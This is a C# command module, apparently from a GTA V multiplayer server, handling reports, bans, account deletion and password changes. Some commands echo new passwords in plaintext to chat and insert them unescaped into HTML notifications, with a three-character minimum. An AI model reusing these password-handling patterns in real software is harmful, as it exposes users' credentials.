            EPlayer.GetAccount(target).Character = "{}";
            EPlayer.ShowCharCreator(target);

            Logs.LogAdmin(player, $"Reset ${target.Name}'s character & clothing to the defaults.");
            target.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] ~w~Admin {player.Name} has reset your character. Please create a new one.");
            player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] ~w~You reset {target.Name}'s character.");
            return;
        }

        [Command("dbgexitlinkmane", Alias = "dbgexitcef", GreedyArg = true)]
        public void cmd_exitdbgcef(Player player)
        {
            if (EPlayer.GetAccount(player).Admin < 6) return;
            player.TriggerEvent("destroyBrowser");
            return;
        }

        [Command("dbgteamvar")]
        public void cmd_dbgteamvar(Player player, int id)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 5) return;

            player.SetSharedData("Team", id);
            return;
        }

        [Command("dbgmaxspeed", Alias = "setmaxspeed")]
        public void cmd_maxspeed(Player player, int speed)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 4) return;

            if (!player.IsInVehicle) return;

            player.Vehicle.SetSharedData("vMaxSpeed", speed / 3.6);
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Set your current vehicle's max speed to " + speed + " KM/H.");
            return;
        }

        [Command("dbgdriveforce", Alias = "setdriveforce")]
        public void cmd_driveforce(Player player, float force)
        {
            if (!EPlayer.LoggedIn(player)) return;
            if (EPlayer.GetAccount(player).Admin < 4) return;

            if (!player.IsInVehicle) return;

            player.Vehicle.SetSharedData("vInitialDriveForce", force);
            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Set your current vehicle's fInitialDriveForce to " + force + ".");
            return;
        }

        [Command("report", "!{#AFAFAF}[USAGE] report (target) (desc)", GreedyArg = true)]
        public void cmd_report(Player player, Player target, string description)
        {
            if (Settings.Requests.Count(r => r.Reported == target && r.Reporter == player) > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have already reported this guy.");
                return;
            }

            RequestData req = new RequestData(player, description, 0);
            req.Reported = target;

            Settings.Requests.Add(req);

            EPlayer.SendMessageToAllAdmins($"!{{#DBCE40}}[REQUEST {req.RequestID}] {player.Name} reported {target.Name} for {description}. (/reports)");
            player.TriggerEvent("pushMsgToChat", "!{#DBCE40}You have filed a report against " + target.Name + ", request ID: " + req.RequestID + ".");
            return;
        }

        [Command("helpme", "!{#AFAFAF}[USAGE] helpme (desc)", Alias = "ask", GreedyArg = true)]
        public void cmd_helpme(Player player, string description)
        {
            if (Settings.Requests.Count(r => r.Reporter == player && r.RequestType == 1) > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You have already asked for assistance, you cannot pile up requests.");
                return;
            }

            RequestData req = new RequestData(player, description, 1);

            Settings.Requests.Add(req);

            EPlayer.SendMessageToAllAdmins($"!{{#1E9913}}[REQUEST {req.RequestID}] {player.Name} asked for help: {description}. (/requests)");
            player.TriggerEvent("pushMsgToChat", "!{#DBCE40}You have successfully sent a helpme request, request ID: " + req.RequestID + ".");
            return;
        }

        [Command("car")]
        public void cmd_car(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}This option has been migrated to server menu. (/keys)");
            return;
        }

        [Command("customvehlist")]
        public void cmd_customvehlist(Player player)
        {
            player.TriggerEvent("pushMsgToChat", "Model 'lspdunm' - Unmarked Dodge Charger");
            player.TriggerEvent("pushMsgToChat", "Model 'polbufac' - Police Buffalo A/C | 'fbibufac' for FIB variant A/C");
            player.TriggerEvent("pushMsgToChat", "Model 'huntley2' - GTA IV Huntley");
            player.TriggerEvent("pushMsgToChat", "Model 'lspdvic' - Ford Crown Victoria CVPI LSPD");
            player.TriggerEvent("pushMsgToChat", "Model 'prevolter' - Police Revolter Unmarked");
            player.TriggerEvent("pushMsgToChat", "Model 'm3e46' - M3 E46 BMW 2005");
            player.TriggerEvent("pushMsgToChat", "Model 'pscout' - Police Scout | 'umkscout' for Unmarked Variant");
            player.TriggerEvent("pushMsgToChat", "Model 'impala' - Chevrolet Impala SS '96");
            player.TriggerEvent("pushMsgToChat", "Model 'shegrangerold' - Police Granger Retro");
            player.TriggerEvent("pushMsgToChat", "Model 'shergauntlet' - Police Bravado Gauntlet A/C");
            player.TriggerEvent("pushMsgToChat", "Model 'polbisonf' - Police Bison");
            player.TriggerEvent("pushMsgToChat", "Model 'gresleyh' - Bravado Gresley Hellhound");
            player.TriggerEvent("pushMsgToChat", "Model 'tulip2' - Declasse Tulip SS");
            player.TriggerEvent("pushMsgToChat", "Model 'golfmk6' - Volkswagen Golf Mk6");
            return;
        }

        [Command("cmds", Alias = "help")]
        public void cmd_help(Player player)
        {
            if (!EPlayer.LoggedIn(player)) return;

            player.TriggerEvent("pushMsgToChat", "!{#FFFFFF}[!{#ffae00}Race !{#FFFFFF}'n !{#0097ff}Chase !{#FFFFFF}Commands]:");
            player.TriggerEvent("pushMsgToChat", "[General]: /ooc /autojoin /b /pm /tog /keys /admins /rules /id /kill");
            player.TriggerEvent("pushMsgToChat", "[General]: /report /helpme /l(ow) /c(ar)w(hisper) /s(hout)");
            player.TriggerEvent("pushMsgToChat", "[Squad/Partner]: /squad /squadleave /s(quad)c(hat) /squadaccept /squadmembers");
            player.TriggerEvent("pushMsgToChat", "[Lobby]: /lobby /(sw)itch(l)obby /mylobby /lobbies /time (/weather)");
            player.TriggerEvent("pushMsgToChat", "[Lobby]: /lobbychat (/lo,/lg) /spec /specoff /(fugitive)chances");
            player.TriggerEvent("pushMsgToChat", "!{#999999}[Account]: /char help (/character) /clothing /stats /changemypass /outfit");
            player.TriggerEvent("pushMsgToChat", "!{#5FBCAC}[Voice]: /voiceblock /voicemode (/keys)");
            player.TriggerEvent("pushMsgToChat", "!{#339BC4}[Cop!{#F24C27}chase]: !{#FFFFFF}/r(adio) /wt");
            player.TriggerEvent("pushMsgToChat", "!{#0097ff}[Cop]: /gps /cuff /m(egaphone) /dragout");
            player.TriggerEvent("pushMsgToChat", "!{#ffae00}[Fugitive]: /d(rive)b(y)");
            player.TriggerEvent("pushMsgToChat", "!{#AB00BA}[Roleplay]: /me /do /handsup /s(top)a(nim)");
            player.TriggerEvent("pushMsgToChat", "!{#AB00BA}[Vehicle]: /trunk /lock /engine /seatbelt /applyvehmods");
            player.TriggerEvent("pushMsgToChat", "!{#AB00BA}[Weapon]: /passgun /restock /applycomps");
            player.TriggerEvent("pushMsgToChat", "!{#28E0DA}[Modes]: /lobby /derby");
            player.TriggerEvent("pushMsgToChat", "!{#28E0DA}[Mode: DM]: /dm /dmarena");
            player.TriggerEvent("pushMsgToChat", "!{#28E0DA}[Mode: Freeroam]: /freeroam /veh /customvehlist /teleport /mytime /myweather");
            player.TriggerEvent("pushMsgToChat", "!{#28E0DA}[Mode: Freeroam]: /togblip /gun /world /godmode /setspawn /tuneveh /afob");
            player.TriggerEvent("pushMsgToChat", "!{#A5A8A8}[Misc]: /updaterate /info /fontsize /voicebind /gpsbind /shotstats");
            player.TriggerEvent("pushMsgToChat", "!{#A5A8A8}[Misc]: /p(acket)l(oss)");
            player.TriggerEvent("pushMsgToChat", "!{#A5A8A8}[Debug/Test]: /pos /lcmenu /dl");

            player.TriggerEvent("pushMsgToChat", "!{#d9f288}[Points] /vtuner /convertpoints /m(ed)k(it) /p(ain)k(illers)");
            player.TriggerEvent("pushMsgToChat", "!{#faf146}[Donator Points] Weapon Components: /buycomp /mycomps /removecomp");

            if (EPlayer.GetAccount(player).DonatorLevel >= 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#F7EB05}[Bronze Donator] /d(onator)c(hat) /settime /setweather");
            }
            if (EPlayer.GetAccount(player).DonatorLevel >= 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#F7EB05}[Silver Donator] /createlobby /deletelobby /setlobbypassword /setlobbyfugitivepercent /lobbymode");
            }

            if (EPlayer.GetAccount(player).Admin >= 1) player.TriggerEvent("pushMsgToChat", "!{#FF6347}For admin commands, visit /acmds.");
            return;
        }

        /*[Command("purchaseammo")] // WORKS -- WAITING ON MENU TAB ADDITION TO INCLUDE THIS
        public void cmd_purchaseammo(Player player)
        {
            jWeaponData wepdat;
            if (Settings.WeaponData.TryGetValue((long)player.CurrentWeapon, out wepdat))
            {
                var data = NAPI.Util.FromJson<Dictionary<string, int>>(EPlayer.GetAccount(player).PurchasedAmmo);
                if (wepdat.AmmoType != null && wepdat.AmmoType.Length >= 2)
                {
                    int purchased = 0;
                    if (!data.TryGetValue(wepdat.AmmoType, out purchased)) purchased = 0;

                    player.TriggerEvent("pushMsgToChat", $"already purchased: {purchased}");
                    data.Remove(wepdat.AmmoType);
                    purchased += 20;
                    data.Add(wepdat.AmmoType, purchased);
                    player.TriggerEvent("pushMsgToChat", $"bought now: {purchased}");

                    EPlayer.GetAccount(player).PurchasedAmmo = NAPI.Util.ToJson(data);
                    ContextFactory.Instance.SaveChanges();
                }
                else player.TriggerEvent("pushMsgToChat", "ammo type is null or inv");
            }
            else player.TriggerEvent("pushMsgToChat", "weapon cant be found in weapondata.json");
        }
        */

        [Command("bancheck", "!{#AFAFAF}[USAGE] bancheck (target name or ban id)", GreedyArg = true)]
        public void cmd_bancheck(Player player, string sqlorname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            int sqlid = -1;
            string[] args = sqlorname.Split(' ');
            if (args.Count() > 0)
            {
                if (!Int32.TryParse(args[0], out sqlid))
                {
                    sqlid = -1;
                }
            }

            BanData ban = null;
            EPlayer.SendMessage(player, "~y~Looking up, please wait...");

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    if (sqlid != -1)
                    {
                        ban = await context.Bans.AsQueryable().FirstOrDefaultAsync(a => a.SQL_ID == sqlid);
                        bancheck_OnLookupBanData(player, ban);
                    }
                    else
                    {
                        Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(sqlorname, StringComparison.OrdinalIgnoreCase));
                        if (tpAcc != null)
                        {
                            ban = await context.Bans.AsQueryable().FirstOrDefaultAsync(a => a.AccountSQLID == tpAcc.SQL_ID);
                            bancheck_OnLookupBanData(player, ban);
                        }
                        else NAPI.Task.Run(() => { EPlayer.SendMessage(player, "!{#FF6347}[!] !{#FFFFFF}Ban data could not be found!"); });
                    }

                }
            });
            return;
        }
        private void bancheck_OnLookupBanData(Player player, BanData ban)
        {
            NAPI.Task.Run(() =>
            {
                if ((ban != null) == false)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no ban with that ID or Name. Try /checkplayer to see any outstanding bans.");
                    return;
                }

                string username = "Unregistered Ban";
                if (ban.AccountSQLID != -1)
                {

                    Task.Run(async () =>
                    {
                        using (MainDatabase context = ContextFactory.CreateContext())
                        {
                            Account pAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(acc => acc.SQL_ID == ban.AccountSQLID);
                            if (pAcc != null)
                            {
                                username = pAcc.Username;
                                bancheck_sendBanInfo(player, ban, username);
                            }
                            else bancheck_sendBanInfo(player, ban, username);
                        }
                    });
                }
            });
        }
        private void bancheck_sendBanInfo(Player player, BanData ban, string username)
        {
            NAPI.Task.Run(() =>
            {
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}Ban ID: {ban.SQL_ID} | Admin: {ban.Admin}");
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}Reason: {ban.Reason} | DateTime: {ban.DateTime}");
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}Name: {username} | SQLID: {ban.AccountSQLID}");
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}IP: {ban.IP}");
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}HWID: {ban.HWID}");
                player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}Rockstar ID: {ban.RockstarID}");
            });
        }

        [Command("ocheckstats", "!{#AFAFAF}[USAGE] ocheckstats (target)", GreedyArg = true)]
        public void cmd_ocheckstats(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            if (RAGE.Entities.Players.All.Where(p => p.Name.Equals(name, StringComparison.OrdinalIgnoreCase)).Count() > 0)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is currently in-game! Use /checkstats!");
                return;
            }

            EPlayer.SendMessage(player, "~y~Looking up, please wait...");

            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);
                    ocheckstats_OnFinishLookup(player, tpAcc);
                }
            });
            return;
        }
        private void ocheckstats_OnFinishLookup(Player player, Account tpAcc)
        {
            NAPI.Task.Run(() =>
            {
                if ((tpAcc != null) == false)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                    return;
                }

                Logs.LogAdmin(player, $"Checked offline player {tpAcc.Username}'s stats.");
                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:ocheckstats:{tpAcc.Username}"); } catch { }

                try
                {
                    EPlayer.ShowStats(player, tpAcc);
                }
                catch
                {
                    EPlayer.SendMessage(player, $"~r~Found the account stats for {tpAcc.Username}, DBID: {tpAcc.SQL_ID}. Cannot display since data is invalid. Inform the dev.");
                }
            });
        }


        [Command("unsuspend", "!{#AFAFAF}[USAGE] unsuspend (account name)", GreedyArg = true)]
        public void cmd_unsuspend(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }


            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true &&
                    p.Suspended == 1);
                    if (tpAcc != null)
                    {
                        tpAcc.Suspended = 0;
                        await context.SaveChangesAsync();
                        unsuspend_OnFinishTask(player, tpAcc);
                    }
                    else unsuspend_OnFinishTask(player, null);
                }
            });

            return;
        }
        private void unsuspend_OnFinishTask(Player player, Account tpAcc)
        {
            NAPI.Task.Run(() =>
            {
                if (tpAcc == null)
                {
                    player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no suspended account with that name.");
                    return;
                }

                Logs.LogAdmin(player, $"Lifted suspension from {tpAcc.Username}'s account.");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has unsuspended {tpAcc.Username}.");
            });
        }

        [Command("changename", "!{#AFAFAF}[USAGE] changename (account name) (new name)")]
        public void cmd_changename(Player player, string name, string newname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            int pAdmin = EPlayer.GetAccount(player).Admin;
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase));

                    if (tpAcc == null)
                    {
                        changename_ReturnErrorTask(player, 0);
                        return;
                    }
                    Account nameCheck = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(newname, StringComparison.OrdinalIgnoreCase));
                    if (nameCheck != null)
                    {
                        changename_ReturnErrorTask(player, 1);
                        return;
                    }
                    if (tpAcc.Admin > pAdmin)
                    {
                        changename_ReturnErrorTask(player, 2);
                        return;
                    }

                    foreach (var arena in await context.Bans.AsQueryable().Where(a => a.Admin.Equals(name, StringComparison.OrdinalIgnoreCase)).ToListAsync())
                    {
                        arena.Admin = newname;
                    }
                    tpAcc.Username = newname;
                    await context.SaveChangesAsync();
                    changename_OnSuccessTask(player, name, newname);
                }
            });
            return;
        }
        private void changename_OnSuccessTask(Player player, string name, string newname)
        {
            NAPI.Task.Run(() =>
            {
                Player target = RAGE.Entities.Players.All.FirstOrDefault(a => a.Name.Equals(name, StringComparison.OrdinalIgnoreCase) == true && EPlayer.LoggedIn(a));
                if (target != null)
                {
                    target.TriggerEvent("pushMsgToChat", "!{#FF6347} Reconnect with your new name: !{#FFFFFF}" + newname);
                    EPlayer.Notify(target, $"Please reconnect with your new name: {newname}", "green", "fas fa-check", false, 3000, "center", "replace");

                    EPlayer.Save(target);
                    target.ResetData("AccountHandle");
                    target.ResetData("LoggedIn");

                    NAPI.Task.Run(() => { try { target.KickSilent(); } catch { } }, 1000);
                }

                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:changename:{name}:{newname}"); } catch { }
                Logs.LogAdmin(player, $"Changed {name}'s username to {newname}.");

                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has changed {name}'s name to {newname}.");

            });
        }
        private void changename_ReturnErrorTask(Player player, int code)
        {
            NAPI.Task.Run(() =>
            {
                switch (code)
                {
                    case 0: player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        break;
                    case 1: player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's already an account with that name!");
                        break;
                    case 2: player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The target's admin level is higher than yours!");
                        break;
                }
            });
        }

        [Command("deleteaccount", "!{#AFAFAF}[USAGE] deleteaccount (account name) | THIS WILL DELETE ALL LOGS AND ALL KINDS OF DATA ON THEM")]
        public void cmd_deleteaccount(Player player, string name)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Player target = RAGE.Entities.Players.All.Find(a => a.Name.Equals(name, StringComparison.OrdinalIgnoreCase) == true && EPlayer.LoggedIn(a));
            if (target != null)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Target is online, duh.");
                return;
            }

            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            int pAdmin = EPlayer.GetAccount(player).Admin;
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);
                    if (tpAcc == null)
                    {
                        deleteaccount_ReturnErrorTask(player, 0);
                        return;
                    }
                    if (tpAcc.Admin > pAdmin)
                    {
                        deleteaccount_ReturnErrorTask(player, 1);
                        return;
                    }

                    await AccountManager.ClearForeignKeys(tpAcc);
                    context.Accounts.Remove(tpAcc);
                    await context.SaveChangesAsync();
                    deleteaccount_SuccessTask(player, tpAcc.Username);
                }
            });

            return;
        }
        private void deleteaccount_SuccessTask(Player player, string deletedUsername)
        {
            NAPI.Task.Run(() =>
            {
                Logs.LogAdmin(player, $"Deleted account '{deletedUsername}'.");
                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has deleted account {deletedUsername}.");
            });
        }
        private void deleteaccount_ReturnErrorTask(Player player, int code)
        {
            NAPI.Task.Run(() =>
            {
                switch (code)
                {
                    case 0:
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no account with that name.");
                        break;
                    case 1:
                        player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}The target's admin level is higher than yours!");
                        break;
                }
            });
        }

        [Command("changepass", "!{#AFAFAF}[USAGE] changepass (account name) (new password)")]
        public void cmd_changepass(Player player, string name, string newpass)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 4)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            int pAdmin = EPlayer.GetAccount(player).Admin;
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(name, StringComparison.OrdinalIgnoreCase) == true);
                    if (tpAcc == null)
                    {
                        // reusing deleteaccount error message function since it's same
                        deleteaccount_ReturnErrorTask(player, 0);
                        return;
                    }
                    if (tpAcc.Admin > pAdmin)
                    {
                        // reusing deleteaccount error message function since it's same
                        deleteaccount_ReturnErrorTask(player, 1);
                        return;
                    }

                    string salt = AccountManager.GenSalt();
                    string password = AccountManager.Crypt(newpass, salt);
                    tpAcc.Salt = salt;
                    tpAcc.Password = password;
                    await context.SaveChangesAsync();

                    changepass_SuccessTask(player, tpAcc, name, newpass);
                }
            });
            return;
        }
        private void changepass_SuccessTask(Player player, Account tpAcc, string name, string newpass)
        {
            NAPI.Task.Run(() =>
            {
                Player target = RAGE.Entities.Players.All.Find(a => a.Name.Equals(name, StringComparison.OrdinalIgnoreCase) == true && EPlayer.LoggedIn(a));
                if (target != null)
                {
                    target.TriggerEvent("pushMsgToChat", "!{#FF6347} Your password has been changed to: !{#FFFFFF}" + newpass);
                    EPlayer.Notify(target, $"Your password has been changed to <p><strong>{newpass}</strong></p>", "green", "fas fa-check", false, 3000, "center", "replace");
                }

                // try { Main.Log("admin.txt", $"{DateTime.Now.ToString().Replace(":", "|")}:{player.Name}:changepass:{name}"); } catch { }
                Logs.LogAdmin(player, $"Changed player {tpAcc.Username}'s password.");

                EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has changed {tpAcc.Username}'s password.");
            });
        }

        [Command("changemypass", "!{#AFAFAF}[USAGE] changemypass (new password)")]
        public void cmd_changemypass(Player player, string newpass)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (player.HasData("LastCryptAttempt") && Environment.TickCount64 - player.GetData<long>("LastCryptAttempt") < 5000)
            {
                player.SendNotification("~r~Hold your horses.", true);
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Hold your horses!");
                return;
            }

            if (newpass.Length < 3)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Your new password must be more than 3 characters!");
                return;
            }

            player.TriggerEvent("pushMsgToChat", "!{#33C446}[>>] !{#FFFFFF}Your password has been changed to: !{#33C446}" + newpass);
            EPlayer.Notify(player, $"Your password has been changed to <p><strong>{newpass}</strong></p>", "green", "fas fa-check", false, 3000, "center", "replace");

            string salt = AccountManager.GenSalt();
            string password = AccountManager.Crypt(newpass, salt);
            EPlayer.GetAccount(player).Salt = salt;
            EPlayer.GetAccount(player).Password = password;
            ContextFactory.SaveDB();
            player.SetData("LastCryptAttempt", Environment.TickCount64);
            return;
        }

        [Command("checkplayer", "!{#AFAFAF}[USAGE] checkplayer (account name) | Checks & gets all associated accounts with a player")]
        public void cmd_checkplayer(Player player, string accountname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 1)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }




            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    Account pAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(acc => acc.Username.Equals(accountname, StringComparison.OrdinalIgnoreCase));
                    if (pAcc == null)
                    {
                        NAPI.Task.Run(() =>
                        {
                            player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}Account does not exist. Use exact name. (case-insensitive)");
                        });
                         return;
                    }
                    Logs.LogAdmin(player, $"Checked {pAcc.Username}'s accounts.");
                    var accounts = EPlayer.GetLinkedAccounts(pAcc).Result; // BONKERS

                    if (accounts.Count > 1)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[#] !{{#FFFFFF}}Matched !{{#33C446}}{accounts.Count - 1} !{{#FFFFFF}}other accounts with !{{#33C446}}{pAcc.Username} !{{#FFFFFF}}SQLID !{{#33C446}}{pAcc.SQL_ID}!{{#FFFFFF}}:"); });

                        int banCount = 0;
                        accounts.ForEach(acc =>
                        {
                            if (context.Bans.Count(ban => ban.AccountSQLID == acc.SQL_ID) >= 1)
                            {
                                NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}{acc.Username} SQLID {acc.SQL_ID} !{{#FF0000}}(/bancheck {acc.Username})"); });
                                banCount++;
                            }
                            else
                            {
                                NAPI.Task.Run(() =>
                                {
                                    player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}{acc.Username} SQLID {acc.SQL_ID}");
                                });
                            }
                        });

                        if (banCount > 0)
                        {
                            NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!!] {pAcc.Username}'s account records are NOT IN GOOD standing. You may tend to the potential ban evader."); });
                        }
                        else NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#33C446}}[>>] {pAcc.Username}'s account records are in good standing. No redflags."); });
                    }
                    else NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}}[!] !{{#FFFFFF}}No other accounts matched with !{{#FF6347}}{pAcc.Username} !{{#FFFFFF}}SQLID !{{#FF6347}}{pAcc.SQL_ID}!{{#FFFFFF}}."); });
                }
            });
            return;
        }

        [Command("checkbanevaders", Alias = "checkallplayers")]
        public void cmd_checkbanevaders(Player player)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            Logs.LogAdmin(player, $"Checked all players for ban evade.");

            EPlayer.SendMessage(player, "~y~Checking online players for ban evasion. ~w~If there aren't any, there will be no messages!");
            foreach (Player p in Settings.LoggedInPlayers)
            {
                Account acc = EPlayer.GetAccount(p);
                Task.Run(async () =>
                {
                    var accounts = EPlayer.GetLinkedAccounts(acc).Result;
                    using (MainDatabase context = ContextFactory.CreateContext())
                    {
                        int banCount = 0;

                        if (accounts.Count > 1)
                        {
                            accounts.ForEach(async acc =>
                            {
                                if (await context.Bans.AsQueryable().CountAsync(ban => ban.AccountSQLID == acc.SQL_ID) >= 1)
                                {
                                    banCount++;
                                }
                            });
                        }
                        if (banCount > 1)
                        {
                            NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", $"!{{#FF6347}} {p.Name} is linked to !{{#FF0000}}{banCount} banned accounts!{{#FF6347}}."); });
                        }
                    }
                });
            }


            return;
        }

        [Command("unban", "!{#AFAFAF}[USAGE] unban (banid or name)", GreedyArg = true)]
        public void cmd_unban(Player player, string sqlorname)
        {
            if (!EPlayer.LoggedIn(player))
                return;

            if (EPlayer.GetAccount(player).Admin < 2)
            {
                player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}You cannot use this command.");
                return;
            }

            int sqlid = -1;
            string[] args = sqlorname.Split(' ');
            if (args.Count() > 0)
            {
                if (!Int32.TryParse(args[0], out sqlid))
                {
                    sqlid = -1;
                }
            }

            BanData ban = null;

            EPlayer.SendMessage(player, "~y~Executing, please wait...");
            Task.Run(async () =>
            {
                using (MainDatabase context = ContextFactory.CreateContext())
                {
                    if (sqlid != -1) ban = await context.Bans.AsQueryable().FirstOrDefaultAsync(a => a.SQL_ID == sqlid);
                    else
                    {
                        Account tpAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(p => p.Username.Equals(sqlorname, StringComparison.OrdinalIgnoreCase) == true);
                        if (tpAcc != null)
                        {
                            ban = await context.Bans.AsQueryable().FirstOrDefaultAsync(a => a.AccountSQLID == tpAcc.SQL_ID);
                        }
                    }

                    if (ban == null)
                    {
                        NAPI.Task.Run(() => { player.TriggerEvent("pushMsgToChat", "!{#FF6347}[!] !{#FFFFFF}There's no ban with that ID or Name."); });
                        return;
                    }

                    string username = "Unregistered Ban";
                    if (ban.AccountSQLID != -1)
                    {
                        Account pAcc = await context.Accounts.AsQueryable().FirstOrDefaultAsync(acc => acc.SQL_ID == ban.AccountSQLID);
                        if (pAcc != null)
                        {
                            username = pAcc.Username;
                        }
                    }
                    NAPI.Task.Run(() =>
                    {
                        EPlayer.SendMessageToAllAdmins($"!{{#FF6347}}[AdmCmd] !{{#FFFFFF}}{player.Name} has unbanned {username}.");
                        player.TriggerEvent("pushMsgToChat", "!{#33C446}[>>] !{#FFFFFF}You have successfully unbanned the player but you may want to /checkplayer to see if there are any outstanding bans on them.");
                    });
                    Logs.LogAdmin(player, $"Unbanned player {username}.");
                    context.Bans.Remove(ban);
